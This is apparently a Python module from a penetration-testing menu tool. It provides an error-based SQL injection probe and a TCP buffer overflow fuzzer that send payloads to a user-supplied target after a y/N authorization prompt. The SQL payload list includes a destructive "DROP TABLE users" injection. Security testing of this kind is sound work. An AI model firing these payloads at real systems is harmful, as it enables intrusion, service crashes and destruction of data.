"""Gaining Access phase.

Techniques Used: SQL injection, Buffer overflow attacks.

(Phishing attacks moved to its own "Social Engineering" top-level menu
- see phases/social_engineering.py - alongside the other social-
engineering techniques it was grouped with there.)

No lab/VM is available for this project (per project decision) - these
tools take a target at run time, same as Scanning, and require the same
y/n authorization confirmation before sending anything.
"""

import socket
import urllib.error
import urllib.parse
import urllib.request

from utils import confirm, prompt

TITLE = "Gaining Access"

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
    "'; DROP TABLE users; --",
]

SQL_ERROR_SIGNS = [
    "sql syntax",
    "mysql_fetch",
    "ora-01756",
    "unclosed quotation mark",
    "sqlite3.operationalerror",
    "pg_query",
    "syntax error",
]


def _authorized(target, input_fn):
    return confirm(
        f"Confirm you own or are authorized to test '{target}' (y/N): ",
        input_fn=input_fn,
    )


def sql_injection_test(input_fn=input):
    url = prompt(
        "Target URL with a parameter to fuzz, e.g. http://host/item?id=1: ",
        input_fn=input_fn,
    )
    if not url or "=" not in url:
        print("Need a URL containing at least one '?param=value'. Aborting.")
        return
    if not _authorized(url, input_fn):
        print("Not confirmed as authorized; aborting.")
        return

    base, _, query = url.partition("?")
    params = query.split("&")
    try:
        target_index = int(
            prompt(
                f"Which parameter to fuzz? {list(enumerate(params))} "
                "(index, default 0): ",
                input_fn=input_fn,
                default="0",
            )
        )
    except ValueError:
        target_index = 0
    if target_index < 0 or target_index >= len(params):
        target_index = 0
    param_name, _, _orig_value = params[target_index].partition("=")

    print(f"\n-- SQL injection probe: {url} (param '{param_name}') --")
    print("Error-based detection only: looks for DB error text in responses.\n")
    baseline_len = None
    for payload in SQLI_PAYLOADS:
        new_params = list(params)
        new_params[target_index] = f"{param_name}={urllib.parse.quote(payload, safe='')}"
        test_url = f"{base}?{'&'.join(new_params)}"
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": "sqli-probe"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read(4096).decode("utf-8", errors="ignore").lower()
                status = resp.status
        except urllib.error.HTTPError as exc:
            status = exc.code
            body = (exc.read(4096) or b"").decode("utf-8", errors="ignore").lower()
        except (urllib.error.URLError, socket.timeout, OSError) as exc:
            print(f"  payload {payload!r}: request failed ({exc})")
            continue

        if baseline_len is None:
            baseline_len = len(body)
        hit = next((sign for sign in SQL_ERROR_SIGNS if sign in body), None)
        flag = f"POSSIBLE SQL ERROR: '{hit}'" if hit else "no error signature seen"
        print(f"  payload {payload!r}: HTTP {status}, {len(body)} bytes - {flag}")
    print(
        "\nNote: absence of an error string is not proof of safety; this is a "
        "quick signal only, not a full SQLi scanner."
    )


def buffer_overflow_fuzz(input_fn=input):
    host = prompt("Target host/IP: ", input_fn=input_fn)
    if not host:
        print("No target given, aborting.")
        return
    if not _authorized(host, input_fn):
        print("Not confirmed as authorized; aborting.")
        return
    try:
        port = int(prompt("Target port: ", input_fn=input_fn, default="0"))
    except ValueError:
        port = 0
    if port <= 0:
        print("Need a valid port, aborting.")
        return
    try:
        max_len = int(
            prompt("Max payload length to reach (default 5000): ",
                   input_fn=input_fn, default="5000")
        )
    except ValueError:
        max_len = 5000

    print(f"\n-- Buffer overflow fuzz: {host}:{port}, up to {max_len} bytes --")
    length = 100
    step = 100
    while length <= max_len:
        payload = b"A" * length
        try:
            with socket.create_connection((host, port), timeout=5) as sock:
                sock.sendall(payload + b"\r\n")
        except (ConnectionError, OSError) as exc:
            print(f"  length {length}: connection failed/dropped ({exc}) - possible crash point")
            return
        print(f"  length {length}: sent ok")
        length += step
    print("Reached max length without a dropped connection.")


SUBMENU = {
    "1": ("SQL injection test (error-based probe)", sql_injection_test),
    "2": ("Buffer overflow fuzzing", buffer_overflow_fuzz),
}


def run(input_fn=input):
    print(f"\n== {TITLE} ==")
    for key, (label, _fn) in SUBMENU.items():
        print(f" {key}. {label}")
    print(" 0. Back")
    choice = prompt("Select an option: ", input_fn=input_fn)
    if choice == "0" or choice == "":
        return
    entry = SUBMENU.get(choice)
    if entry is None:
        print("Invalid option.")
        return
    _label, fn = entry
    fn(input_fn=input_fn)
